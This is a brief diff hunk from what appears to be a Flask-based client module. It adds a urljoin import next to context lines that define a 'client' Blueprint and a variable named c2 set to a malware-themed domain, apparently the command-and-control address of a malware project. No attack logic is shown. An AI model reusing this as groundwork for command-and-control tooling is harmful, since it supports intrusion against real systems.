@@ -4,6 +4,7 @@ from wtforms import StringField, SubmitField
 from wtforms.validators import DataRequired, Length
 import secrets
 from cvnt.client_pb2 import *
+from urllib.parse import urljoin
 
 client = Blueprint('client', __name__, template_folder='templates')
 c2 = "https://rigamalwarole.com"
